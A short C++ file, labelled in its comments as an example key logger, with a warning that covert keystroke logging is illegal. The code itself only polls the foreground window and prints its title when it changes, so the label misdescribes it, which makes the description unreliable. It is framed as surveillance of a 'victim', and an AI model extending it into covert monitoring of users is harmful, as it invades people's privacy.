// Created By: Tommie Navitskas 2023

// The following is an example of a key logger written in C++

// Please note that it is illegal to log a victims keystrokes without their knowledge.

#include <iostream>
#include <Windows.h>

int main()
{
    HWND hWnd = GetForegroundWindow();
    char currentWindow[256];

    while(true)
    {
        if (GetForegroundWindow() != hWnd)
        {
            hWnd = GetForegroundWindow();
            GetWindowText(hWnd, currentWindow, sizeof(currentWindow));
            std::cout << currentWindow << std::endl;
        }
        Sleep(10);
    }

    return 0;
}
